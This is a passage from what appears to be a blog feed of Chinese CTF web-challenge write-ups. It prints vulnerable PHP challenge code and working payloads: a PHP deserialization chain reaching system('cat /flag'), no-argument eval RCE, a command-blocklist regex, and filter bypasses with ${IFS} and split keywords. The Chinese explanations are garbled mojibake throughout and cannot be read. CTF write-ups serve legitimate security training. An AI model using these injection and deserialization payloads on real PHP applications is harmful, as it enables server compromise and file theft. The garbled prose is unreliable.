2023!%0a<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªif</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if (<span class="hljs-name">intval</span>($_GET[&#x27;lover&#x27;]) &lt; <span class="hljs-number">2023</span> <span class="hljs-symbol">&amp;&amp;</span> intval($_GET[&#x27;lover&#x27;] + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2024</span>)<br></code></pre></td></tr></table></figure><p>intvalæœ‰ä¸€ä¸ªå°æ¼æ´<br>intval(â€˜2e4â€™)ä¸º2è€Œintval(â€˜2e4â€™+1)ä¸º20001<br>payload</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">lover</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>e4<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸‰ã€å››ä¸ªif</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if (<span class="hljs-name">isset</span>($_POST[&#x27;qw&#x27;]) <span class="hljs-symbol">&amp;&amp;</span> $_POST[&#x27;yxx&#x27;])<br>if (<span class="hljs-name">sha1</span>($array1) === sha1($array2))<br></code></pre></td></tr></table></figure><p>æœ¬æ¥ä»¥ä¸ºè¦å¼ºç¢°æ’ç»•è¿‡ï¼Œä½†å‡ºé¢˜äººå¥½åƒæœ‰ç‚¹ç–å¿½äº†,è®©ä¸¤ä¸ªpostç›¸ç­‰å³å¯<br>ç›´æ¥payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">qw</span>=<span class="hljs-number">1</span>&amp;yxx=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æœ€åä¸€ä¸ªif</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if (<span class="hljs-name">isset</span>($_POST[&#x27;SYC_GEEK.<span class="hljs-number">2023</span>&#x27;])<span class="hljs-symbol">&amp;&amp;</span>($_POST[&#x27;SYC_GEEK.<span class="hljs-number">2023</span>&#x27;]=<span class="hljs-string">&quot;Happy to see you!&quot;</span>))<br></code></pre></td></tr></table></figure><p>æŠŠç¬¬ä¸€ä¸ªä¸‹åˆ’çº¿æ”¹ä¸º<code>[</code>å³å¯(ä½¿åé¢çš„ç‰¹æ®Šå­—ç¬¦ä¸è¢«è½¬ä¹‰)<br>payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">SYC[GEEK.<span class="hljs-attribute">2023</span>=Happy <span class="hljs-keyword">to</span> see you!<br></code></pre></td></tr></table></figure><h2 id="unsign"><a href="#unsign" class="headerlink" title="unsign"></a>unsign</h2><p>ååºåˆ—åŒ–é¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cuit</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;action!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$function</span>=<span class="hljs-variable language_">$this</span>-&gt;cuit;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lover</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yxx</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;invoke!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;yxx-&gt;QW;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eva1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$interesting</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;get!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$eva1</span>=<span class="hljs-variable language_">$this</span>-&gt;eva1;<br>        <span class="hljs-variable">$eva1</span>(<span class="hljs-variable language_">$this</span>-&gt;interesting);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) <br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><ul><li><p>__construct()ï¼šå®ä¾‹åŒ–å¯¹è±¡æ—¶ï¼Œé¦–å…ˆä¼šå»è‡ªåŠ¨æ‰§è¡Œçš„ä¸€ä¸ªæ–¹æ³•</p></li><li><p>__invoke()ï¼šæ ¼å¼è¡¨è¾¾é”™è¯¯å¯¼è‡´æ²¡é­”æœ¯æ–¹æ³•è§¦å‘ï¼ˆæŠŠå¯¹è±¡å½“æˆå‡½æ•°è°ƒç”¨ï¼‰</p></li><li><p>__get()ï¼šè°ƒç”¨çš„æˆå‘˜å±æ€§æ˜¯ç§æœ‰å±æ€§æˆ–ä¸å­˜åœ¨æ—¶è§¦å‘ï¼ˆè¿”å›å€¼ï¼šä¸å­˜åœ¨çš„æˆå‘˜å±æ€§çš„åç§°ï¼‰</p></li></ul><p>æ„é€ å‡ºè¿™å‡ è¡Œä»£ç </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$a</span>=new web();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">eva1</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">interesting</span>=<span class="hljs-string">&quot;cat /flag&quot;</span>;<br><span class="hljs-variable">$b</span>=new lover();<br><span class="hljs-variable">$b</span>-&gt;<span class="hljs-attribute">yxx</span>=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$b</span>-&gt;<span class="hljs-attribute">QW</span>=<span class="hljs-string">&#x27;asd&#x27;</span>;//èµ‹ä¸€æœªçŸ¥å€¼æ¥è°ƒç”¨__get<br><span class="hljs-variable">$c</span>=new syc();<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-attribute">cuit</span>=<span class="hljs-variable">$b</span>;//è§¦å‘__invoke<br><br>echo serialize(<span class="hljs-variable">$c</span>);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>=O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;syc&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;cuit&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;lover&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;yxx&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;eva1&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;interesting&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;cat /flag&quot;</span>;&#125;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;QW&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;asd&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="Pupyy-rce"><a href="#Pupyy-rce" class="headerlink" title="Pupyy_rce"></a>Pupyy_rce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(flag.php);<br><span class="hljs-comment">//å½“å‰ç›®å½•ä¸‹æœ‰å¥½åº·çš„ğŸ˜‹</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$var</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>];<br>   <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/env|var|session|header/i&quot;</span>, <span class="hljs-variable">$var</span>,<span class="hljs-variable">$match</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$var</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;WAF!!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;PLZ DONT HCAK MEğŸ˜…&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$var</span>))<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>[ \f\n\r\t\v]ã€‚</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs \sï¼š```åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢é¡µç¬¦ç­‰ç­‰ã€‚ç­‰ä»·äº">```+?ï¼š```å¯¹äºå­—ç¬¦ä¸² &quot;oooo&quot;ï¼Œ&#x27;o+?&#x27; å°†åŒ¹é…å•ä¸ª &quot;o&quot;ï¼Œè€Œ &#x27;o+&#x27; å°†åŒ¹é…æ‰€æœ‰ &#x27;o&#x27;<br>```(?R)?ï¼š```(?R)ä»£è¡¨å½“å‰è¡¨è¾¾å¼ï¼Œå°±æ˜¯```/[^\s\(\)]+?\((?R)?\)/```ï¼Œæ‰€ä»¥ä¼šä¸€ç›´é€’å½’,?è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–1æ¬¡ï¼ˆè‹¥æ˜¯(?R)*åˆ™è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–å¤šæ¬¡ï¼Œä¾‹å¦‚å®ƒå¯ä»¥åŒ¹é…a(b(c()d())))<br>è€Œ(?R)?èƒ½åŒ¹é…çš„åªæœ‰a(b()); a(b(c()));è¿™ç§ç±»å‹çš„ï¼Œæ¯”å¦‚ä¼ å…¥a(b(c()));,ç¬¬ä¸€æ¬¡åŒ¹é…åï¼Œå°±å‰©a(b()),ç¬¬äºŒæ¬¡åŒ¹é…å,a();,ç¬¬ä¸‰æ¬¡åŒ¹é…åå°±å‰©ä¸‹;äº†ï¼Œæœ€åa(b(c()))å°±ä¼šè¢«evalæ‰§è¡Œã€‚<br><br>æ€è·¯æ˜ç¡®äº†ï¼Œè¿™é¢˜åº”è¯¥ä½¿ç”¨æ— å‚RCE<br>ä¸‹é¢æ˜¯æ— å‚RCEçš„å¸¸ç”¨å‡½æ•°<br></code></pre></td></tr></table></figure><p>getchwd()ï¼šå‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚<br>scandir()ï¼šå‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚<br>dirname()ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚<br>chdir()ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚<br>readfile()ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚<br>current()ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚<br>pos()ï¼šcurrent() çš„åˆ«åã€‚<br>next()ï¼šå‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br>end()ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br>array_rand()ï¼šå‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚<br>array_flip()ï¼šarray_flip() å‡½æ•°ç”¨äºåè½¬&#x2F;äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚<br>array_slice()ï¼šå‡½æ•°åœ¨æ•°ç»„ä¸­æ ¹æ®æ¡ä»¶å–å‡ºä¸€æ®µå€¼ï¼Œå¹¶è¿”å›ã€‚<br>array_reverse()ï¼šå‡½æ•°è¿”å›ç¿»è½¬é¡ºåºçš„æ•°ç»„ã€‚<br>chr() å‡½æ•°ä»æŒ‡å®šçš„ï¼šASCII å€¼è¿”å›å­—ç¬¦ã€‚<br>hex2bin()ï¼šâ€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚<br>getenv()ï¼šè·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼(åœ¨7.1ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°)ã€‚<br>localeconv()ï¼šå‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><br><span class="hljs-symbol">payload:</span><br></code></pre></td></tr></table></figure><p>?var&#x3D;print_r(scandir(pos(localeconv())));<br>&#x2F;&#x2F;Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; error.log [3] &#x3D;&gt; <a href="mailto:&#x66;&#108;&#x40;&#x67;&#46;&#x70;&#x68;&#x70;">&#x66;&#108;&#x40;&#x67;&#46;&#x70;&#x68;&#x70;</a> [4] &#x3D;&gt; genshin01.txt [5] &#x3D;&gt; index.php [6] &#x3D;&gt; tiangou01.txt [7] &#x3D;&gt; tiangou02.txt )</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>å¯ä»¥çœ‹å‡ºflagåœ¨ä¸€ä¸ªç‰¹æ®Šçš„ä½ç½®ä¸Šï¼Œæ— æ³•é€šè¿‡nextæˆ–endç›´æ¥è¯»å–ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨éšæœºå‡½æ•°<br>å¯ä»¥ç”¨```array_rand()```å’Œ```array_flip()```<br>(```array_rand()```è¿”å›çš„æ˜¯é”®åæ‰€ä»¥å¿…é¡»æ­é…```array_flip()```æ¥äº¤æ¢é”®åã€é”®å€¼æ¥è·å¾—é”®å€¼ï¼Œéšæœºåˆ·æ–°æ˜¾ç¤ºçš„å†…å®¹)<br><br><span class="hljs-title">payload:</span><br></code></pre></td></tr></table></figure><p>?var&#x3D;show_source(array_rand(array_flip(scandir(pos(localeconv())))));</p><pre><code class="hljs">å¤šåˆ·æ–°å‡ éå°±å‡ºæ¥äº†</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>shctf</title>
    <link href="/2023/10/26/shctf/"/>
    <url>/2023/10/26/shctf/</url>
    
    <content type="html"><![CDATA[<h2 id="WEEK1-babyRCE"><a href="#WEEK1-babyRCE" class="headerlink" title="[WEEK1]babyRCE"></a>[WEEK1]babyRCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$rce</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;rce&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$rce</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="hljs-variable">$rce</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$rce</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hhhhhhacker!!!&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç®€å•çš„ç»•è¿‡<br>ç©ºæ ¼è¢«è¿‡æ»¤ä½¿ç”¨${IFS}ä¸èƒ½ä½¿ç”¨%20æˆ–%09ï¼Œå› ä¸ºè¿™é‡Œé¢åŒ…å«æ•°å­—å’Œ%<br>cat å’Œflagå…³é”®å­—è¢«è¿‡æ»¤å¯ä»¥åœ¨å­—ç¬¦ä¸­é—´æ’å…¥<code>&#39;&#39;</code>æˆ–<code>\</code>ï¼Œè¿™é¢˜åŒæ ·è¿‡æ»¤äº†<code>&#39;&#39;</code>ï¼Œä½¿ç”¨\å³å¯<br>payload:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">?rce=<span class="hljs-keyword">ls</span><br><span class="hljs-comment">//flag.php index.php</span><br>?rce=<span class="hljs-keyword">ca</span>\t<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-keyword">fl</span>\ag.php<br></code></pre></td></tr></table></figure><p>è¿”å›ä¸€ä¸ªphpä»£ç (æ„Ÿè§‰å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚ã€‚ã€‚)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;GZCTF_FLAG&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag</span>==<span class="hljs-string">&quot;not_flag&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$flag</span>==<span class="hljs-string">&quot;&quot;</span>)&#123;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;dzctf&#123;test_flag&#125;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">?rce=<span class="hljs-keyword">ls</span>$&#123;IFS&#125;/<br><span class="hljs-comment">//bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></code></pre></td></tr></table></figure><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">?rce=cat$&#123;IFS&#125;/flag<br>//flag&#123;4289e79a-<span class="hljs-number">8b35</span>-<span class="hljs-number">4b79</span>-<span class="hljs-number">8128</span>-40f4777d31b2&#125;<br></code></pre></td></tr></table></figure><h2 id="WEEK1-1zzphp"><a href="#WEEK1-1zzphp" class="headerlink" title="[WEEK1]1zzphp"></a>[WEEK1]1zzphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;./index.txt&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c_ode&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$code</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c_ode&#x27;</span>];<br>    <span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no number!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))<br>    &#123;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?SHCTF/is&#x27;</span>, <span class="hljs-variable">$code</span>))<br>      &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no touch!&#x27;</span>);<br>      &#125;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$code</span>,<span class="hljs-string">&#x27;2023SHCTF&#x27;</span>) === <span class="hljs-literal">FALSE</span>)<br>      &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;what do you want&#x27;</span>);<br>      &#125;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>numæ•°ç»„ç»•è¿‡å³å¯<br>é‡ç‚¹åœ¨äº</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?SHCTF/is&#x27;</span>, <span class="hljs-variable">$code</span>))<br>      &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no touch!&#x27;</span>);<br>      &#125;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$code</span>,<span class="hljs-string">&#x27;2023SHCTF&#x27;</span>) === <span class="hljs-literal">FALSE</span>)<br>      &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;what do you want&#x27;</span>);<br>      &#125;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br></code></pre></td></tr></table></figure><p>&#x2F;isï¼šå¤§å°å†™ä¸ç©ºæ ¼æ¢è¡ŒåŒè¿‡æ»¤<br>è¿™é‡Œä¸èƒ½ç”¨æ•°ç»„ç»•è¿‡<br>å› ä¸ºï¼š<br>è™½ç„¶èƒ½ç»•è¿‡ç¬¬ä¸€ä¸ªpreg_match()<br>è™½è¯´null&#x3D;&#x3D;&#x3D;falseè¿”å›çš„æ˜¯falseæ˜¯å¯ä»¥ç»•è¿‡çš„<br>ä½†åœ¨å®é™…æµ‹è¯•ä¸­è¿˜æ˜¯æ²¡æœ‰ç»•è¿‡ï¼Œç©¶å…¶åŸå› æ˜¯<code>$code = 